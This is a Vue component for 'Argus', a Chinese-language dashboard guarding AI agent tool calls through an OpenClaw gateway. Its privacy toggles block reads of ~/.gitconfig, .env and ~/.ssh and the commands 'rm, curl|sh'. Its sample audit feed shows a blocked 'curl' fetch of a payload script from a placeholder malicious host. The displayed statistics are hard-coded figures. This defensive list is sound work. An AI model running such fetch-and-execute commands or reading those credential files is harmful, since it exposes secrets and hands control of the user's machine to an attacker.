<template>
  <div class="grid grid-cols-1 md:grid-cols-3 gap-5 my-2">
    <!-- Card 1: Master Shield Bento Card (Spans 2 cols on wide screen) -->
    <div class="coder-card md:col-span-2 p-6 flex flex-col justify-between">
      <div>
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-[#FF6900]/10 border border-[#FF6900]/20 flex items-center justify-center text-[#FF6900]">
              <ShieldAlert class="w-5 h-5" />
            </div>
            <div>
              <h3 class="font-bold text-zinc-900 text-lg">零信任核心主动防御</h3>
              <p class="text-xs text-zinc-500">实时深层行为感知与高并发多模型代理决策</p>
            </div>
          </div>
          <!-- MiMo Orange Switch Toggle -->
          <button
            @click="toggleMaster"
            :class="[
              'relative inline-flex h-7 w-14 items-center rounded-full transition-colors duration-300 focus:outline-none cursor-pointer',
              masterEnabled ? 'bg-[#FF6900] shadow-[0_0_16px_rgba(255,105,0,0.4)]' : 'bg-zinc-200'
            ]"
          >
            <span
              :class="[
                'inline-block h-5 w-5 transform rounded-full bg-white transition duration-300 shadow-md',
                masterEnabled ? 'translate-x-8' : 'translate-x-1'
              ]"
            />
          </button>
        </div>

        <div class="mt-6 grid grid-cols-3 gap-4">
          <div class="p-4 rounded-xl bg-zinc-50 border border-zinc-200/70">
            <span class="text-xs text-zinc-500 block">今日威胁拦截</span>
            <span class="text-2xl font-mono font-bold text-[#FF6900] mt-1 block">14 次</span>
            <span class="text-[10px] text-emerald-600 mt-1 block">↑ 100% 成功阻断</span>
          </div>
          <div class="p-4 rounded-xl bg-zinc-50 border border-zinc-200/70">
            <span class="text-xs text-zinc-500 block">安全通过调用</span>
            <span class="text-2xl font-mono font-bold text-zinc-900 mt-1 block">1,280</span>
            <span class="text-[10px] text-zinc-400 mt-1 block">平均耗时 0.9ms</span>
          </div>
          <div class="p-4 rounded-xl bg-zinc-50 border border-zinc-200/70">
            <span class="text-xs text-zinc-500 block">近永久隔离文件</span>
            <span class="text-2xl font-mono font-bold text-cyan-600 mt-1 block">3 份</span>
            <span class="text-[10px] text-zinc-400 mt-1 block">待工单审核解封</span>
          </div>
        </div>
      </div>

      <!-- 守护开关联动重启 OpenClaw 设置 -->
      <label class="mt-4 flex items-center gap-2 text-xs text-zinc-500 cursor-pointer select-none">
        <input type="checkbox" v-model="autoRestartOpenClaw" class="w-4 h-4 accent-[#FF6900] rounded cursor-pointer" />
        <span>开启 / 关闭守护时自动重启 OpenClaw（让网关配置生效，版本切换时始终自动重启）</span>
      </label>
      <!-- Footer indicator -->
      <div class="mt-6 pt-4 border-t border-zinc-100 flex items-center justify-between text-xs text-zinc-500">
        <div class="flex items-center gap-2">
          <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
          <span>{{ masterEnabled ? "防御引擎已就绪：动态策略规则 v7.2 加载完毕" : "防御已暂停：网关直通，审计仅记录" }}</span>
        </div>
        <button class="text-[#FF6900] hover:underline flex items-center gap-1 font-medium cursor-pointer">
          查看拦截报告
          <ChevronRight class="w-3.5 h-3.5" />
        </button>
      </div>
    </div>

    <!-- Card 2: Quick Privacy Shield (1 col) -->
    <div class="coder-card p-6 flex flex-col justify-between">
      <div>
        <div class="flex items-center gap-3 mb-4">
          <div class="w-9 h-9 rounded-xl bg-cyan-50 border border-cyan-200 flex items-center justify-center text-cyan-600">
            <Lock class="w-4 h-4" />
          </div>
          <div>
            <h3 class="font-bold text-zinc-900 text-base">个人极简隐私屏障</h3>
            <p class="text-xs text-zinc-500">一键勾选关键资产保护</p>
          </div>
        </div>

        <!-- Checkbox Options -->
        <div class="space-y-2.5 mt-2">
          <label
            v-for="(item, idx) in privacyOptions"
            :key="idx"
            class="flex items-center justify-between p-2.5 rounded-xl bg-zinc-50/80 hover:bg-zinc-100 border border-zinc-200/60 cursor-pointer transition-all"
          >
            <div class="flex items-center gap-2.5">
              <input
                type="checkbox"
                v-model="item.checked"
                class="w-4 h-4 accent-[#FF6900] rounded cursor-pointer"
              />
              <span class="text-xs font-medium text-zinc-800">{{ item.label }}</span>
            </div>
            <span class="text-[10px] px-1.5 py-0.5 rounded bg-zinc-200/70 text-zinc-600 font-mono">{{ item.tag }}</span>
          </label>
        </div>
      </div>

      <div class="mt-4 text-[11px] text-zinc-500 flex items-center justify-between">
        <span>自动应用到网关</span>
        <button
          @click="savePrivacySettings"
          class="text-xs px-3 py-1 rounded-lg bg-[#FF6900]/10 hover:bg-[#FF6900]/20 text-[#FF6900] border border-[#FF6900]/25 transition-all font-medium cursor-pointer"
        >
          保存生效
        </button>
      </div>
    </div>

    <!-- Card 3: Daemon Services Status -->
    <div class="coder-card p-6 flex flex-col justify-between">
      <div>
        <div class="flex items-center gap-3 mb-4">
          <div class="w-9 h-9 rounded-xl bg-emerald-50 border border-emerald-200 flex items-center justify-center text-emerald-600">
            <Server class="w-4 h-4" />
          </div>
          <div>
            <h3 class="font-bold text-zinc-900 text-base">后台守护进程集群</h3>
            <p class="text-xs text-zinc-500">主进程双向监控与自动拉起</p>
          </div>
        </div>

        <div class="space-y-2.5">
          <div
            v-for="svc in services"
            :key="svc.name"
            class="flex items-center justify-between p-2.5 rounded-xl bg-zinc-50 border border-zinc-200/60"
          >
            <div class="flex items-center gap-2">
              <span :class="['w-2 h-2 rounded-full', svc.running ? 'bg-emerald-500' : 'bg-red-500']"></span>
              <span class="text-xs font-medium text-zinc-800">{{ svc.name }}</span>
            </div>
            <div class="flex items-center gap-2">
              <span class="text-[11px] font-mono text-zinc-500">{{ svc.port }}</span>
              <span :class="['text-[10px] px-2 py-0.5 rounded-full border font-medium', svc.running ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-red-50 text-red-700 border-red-200']">
                {{ svc.running ? '已拉起' : '未就绪' }}
              </span>
            </div>
          </div>
        </div>
      </div>

      <div class="mt-4 pt-3 border-t border-zinc-100 flex items-center justify-between">
        <button
          @click="restartAllServices"
          class="text-xs text-zinc-600 hover:text-zinc-900 flex items-center gap-1.5 cursor-pointer font-medium"
        >
          <RefreshCw class="w-3.5 h-3.5" />
          全部重启
        </button>
        <span class="text-[11px] text-zinc-400">免登录单机守护模式</span>
      </div>
    </div>

    <!-- Card 4: Recent Live Events (Spans 2 cols) -->
    <div class="coder-card md:col-span-2 p-6 flex flex-col justify-between">
      <div>
        <div class="flex items-center justify-between mb-4">
          <div class="flex items-center gap-3">
            <div class="w-9 h-9 rounded-xl bg-purple-50 border border-purple-200 flex items-center justify-center text-purple-600">
              <Activity class="w-4 h-4" />
            </div>
            <div>
              <h3 class="font-bold text-zinc-900 text-base">实时阻断与安全感知流水</h3>
              <p class="text-xs text-zinc-500">多模态 Agent 工具调用深层分析</p>
            </div>
          </div>
          <span class="text-xs text-zinc-400 font-mono">LIVE FEED</span>
        </div>

        <div class="space-y-2">
          <div
            v-for="(evt, idx) in auditEvents"
            :key="idx"
            class="flex items-center justify-between p-2.5 rounded-xl bg-zinc-50 border border-zinc-200/60 text-xs font-mono"
          >
            <div class="flex items-center gap-3">
              <span :class="['px-2 py-0.5 rounded text-[10px] font-bold border', evt.blocked ? 'bg-red-50 text-red-600 border-red-200' : 'bg-emerald-50 text-emerald-600 border-emerald-200']">
                {{ evt.action }}
              </span>
              <span class="text-zinc-800 font-sans font-medium">{{ evt.target }}</span>
            </div>
            <div class="flex items-center gap-4 text-zinc-500 text-[11px]">
              <span>{{ evt.agent }}</span>
              <span>{{ evt.time }}</span>
            </div>
          </div>
        </div>
      </div>

      <div class="mt-4 pt-3 border-t border-zinc-100 flex items-center justify-between text-xs text-zinc-400">
        <span>共收录 1,294 条行为日志</span>
        <button class="text-[#FF6900] hover:underline flex items-center gap-1 font-medium cursor-pointer">
          导出全量审计日志 (.jsonl)
          <Download class="w-3.5 h-3.5" />
        </button>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, watch } from 'vue'
import {
  ShieldAlert,
  Lock,
  Server,
  Activity,
  ChevronRight,
  RefreshCw,
  Download
} from 'lucide-vue-next'

const masterEnabled = ref(true)
try { if (localStorage.getItem('argus.master-enabled') === '0') masterEnabled.value = false } catch {}
const autoRestartOpenClaw = ref(true)
try { if (localStorage.getItem('argus.auto-restart-openclaw') === '0') autoRestartOpenClaw.value = false } catch {}
watch(autoRestartOpenClaw, (v) => { try { localStorage.setItem('argus.auto-restart-openclaw', v ? '1' : '0') } catch {} })
async function toggleMaster() {
  masterEnabled.value = !masterEnabled.value
  try { localStorage.setItem('argus.master-enabled', masterEnabled.value ? '1' : '0') } catch {}
  if (!autoRestartOpenClaw.value) return
  try { await window.electronAPI?.restartOpenClaw?.('guard-toggle:' + (masterEnabled.value ? 'on' : 'off')) } catch {}
}

const privacyOptions = ref([
  { label: '拦截读取 ~/.gitconfig 凭据', tag: 'SECRET', checked: true },
  { label: '拦截读取 .env / API 密钥文件', tag: 'TOPSECRET', checked: true },
  { label: '拦截访问 ~/.ssh 私钥与证书', tag: 'CONFIDENTIAL', checked: true },
  { label: '拦截高危危险命令 (rm, curl|sh)', tag: 'COMMAND', checked: true }
])

const services = ref([
  { name: 'Argus API (FastAPI)', port: '127.0.0.1:8000', running: true },
  { name: 'OpenClaw Gateway (Core)', port: '127.0.0.1:18789', running: true }
])

const auditEvents = ref([
  { action: 'BLOCK_READ', target: 'e:/tiaozhanbei/MAC/.env', agent: 'OpenClaw-Worker', time: '23:41:02', blocked: true },
  { action: 'ALLOW_LIST', target: 'e:/tiaozhanbei/MAC/src/', agent: 'Code-Researcher', time: '23:40:15', blocked: false },
  { action: 'BLOCK_EXEC', target: 'curl -s https://malicious.io/payload.sh', agent: 'Auto-Runner', time: '23:38:44', blocked: true },
  { action: 'ALLOW_READ', target: 'e:/tiaozhanbei/MAC/README.md', agent: 'Doc-Writer', time: '23:35:10', blocked: false }
])

function savePrivacySettings() {
  alert('个人隐私防护策略已保存并同步给守护网关！')
}

function restartAllServices() {
  if (window.electronAPI) {
    window.electronAPI.restartServices()
  } else {
    alert('正在向守护进程发送重启指令...')
  }
}
</script>
